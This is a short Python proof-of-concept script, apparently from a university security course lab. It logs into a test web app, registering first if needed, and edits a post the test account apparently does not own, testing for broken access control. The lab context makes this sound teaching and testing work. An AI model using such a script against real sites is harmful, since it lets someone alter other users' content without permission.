import requests, sys, re, time, random

params = { 
    'username': 'pentest1',
    'password': 'pentest1'
}
if len(sys.argv) == 2:
    url = sys.argv[1]
else:
    url = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'

resource = '/login'


s = requests.Session()

path = url + resource
r = s.post(url=path, data=params)

if len(s.cookies) == 0:
    resource = '/register'
    path = url + resource
    r = s.post(url=path, data=params)
    resource = '/login'
    path = url + resource
    r = s.post(url=path, data=params)
    if len(s.cookies) == 0:
        print("Login && registration not successful! :(")
        print("Usage:\n\tpython3 vulnX.py [username] [password]\n")
        exit(2)

resource = '/edit_post'
path = url + resource
post_id = 2

rind = str(random.randrange(1, 1000))

new_line = "Edited by " + params['username'] + ", change id: " + rind
params = { 
    'id': post_id,
    'content': new_line,
    'type': "Public"
}
r = s.post(url=path, data=params)
changed_line = re.findall(r'Edited (.+?)</a>', r.text)[0]
print("Changed post:\n\t" + changed_line)
# 'Edited ' is not part of changed_line because it's used in regex --> new_line[7:]
assert new_line[7:] in changed_line
